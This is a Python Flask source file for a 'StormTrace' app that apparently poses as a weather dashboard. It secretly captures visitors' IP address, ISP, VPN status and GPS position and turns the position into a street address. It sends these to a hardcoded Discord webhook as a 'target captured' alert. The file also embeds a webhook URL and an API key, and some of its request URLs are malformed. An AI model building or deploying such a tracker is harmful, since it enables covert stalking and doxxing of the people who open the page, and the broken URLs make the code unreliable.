import os
import requests
from flask import Flask, render_template, request, jsonify
from geopy.geocoders import Nominatim

app = Flask(__name__)

# --- CONFIGURATION ---
# 1. Get your webhook from Discord Channel Settings > Integrations
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1482323306198601780/bvnAqpLHXijSAMi0fwJQV-IZG2nXdoScT4MFttVL3e42cXtol1HiGDGqR1AdsscKDzKG"

# 2. Get a free API key at https://www.ip2location.io
IP_API_KEY = "6DE085F79B20D090372DCDAB19FA7413"

# Initialize Geocoder for Exact Street Address
geolocator = Nominatim(user_agent="StormTrace_Intelligence_v4")

@app.route('/')
def index():
    # Capture Real IP to display on the Thunder Dashboard
    # 'X-Forwarded-For' is required for apps hosted on Render/Heroku
    visitor_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if visitor_ip and ',' in visitor_ip:
        visitor_ip = visitor_ip.split(',')[0].strip()
    
    return render_template('index.html', user_ip=visitor_ip)

@app.route('/geo', methods=['POST'])
def capture_and_log():
    data = request.json
    lat, lon = data.get('lat'), data.get('lon')
    
    # 1. Identify Network Details
    visitor_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if visitor_ip and ',' in visitor_ip:
        visitor_ip = visitor_ip.split(',')[0].strip()

    # 2. Fetch ISP and VPN Status
    try:
        api_url = f"https://api.ip2location.io{IP_API_KEY}&ip={visitor_ip}&format=json"
        ip_res = requests.get(api_url).json()
        vpn_status = "✅ YES" if ip_res.get('is_proxy') else "❌ NO"
        isp_name = ip_res.get('isp', 'Unknown ISP')
        country = ip_res.get('country_name', 'Unknown')
        city = ip_res.get('city_name', 'Unknown')
    except Exception as e:
        vpn_status, isp_name, country, city = "Error", "Unknown", "Unknown", "Unknown"

    # 3. Convert GPS to Exact Street Address (Reverse Geocoding)
    try:
        location_obj = geolocator.reverse(f"{lat}, {lon}")
        full_address = location_obj.address
    except:
        full_address = "Could not retrieve exact street name."

    # 4. Construct the Detailed Discord Webhook (Vertical Fields)
    payload = {
        "username": "StormTrace Intelligence",
        "embeds": [{
            "title": "⚡ HIGH-PRECISION TARGET CAPTURED",
            "color": 3066993, # Electric Green
            "fields": [
                {"name": "🌐 Network IP", "value": f"`{visitor_ip}`", "inline": False},
                {"name": "🛡️ VPN/Proxy Detected", "value": vpn_status, "inline": True},
                {"name": "📡 ISP Provider", "value": isp_name, "inline": True},
                {"name": "🏙️ ISP Location", "value": f"{city}, {country}", "inline": False},
                {"name": "📍 Exact House/Street Address", "value": f"``` {full_address} ```", "inline": False},
                {"name": "🗺️ Google Maps Link", "value": f"[Click to View Exact Location](https://www.google.com{lat},{lon})", "inline": False}
            ],
            "footer": {"text": "Verified GPS & Reverse Geocoding System"},
            "timestamp": requests.utils.quote(str(os.times())) # Optional timestamp
        }]
    }
    
    # Send to Discord
    requests.post(DISCORD_WEBHOOK_URL, json=payload)
    return jsonify({"status": "verified"})

if __name__ == "__main__":
    # Port binding for Render deployment
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
    
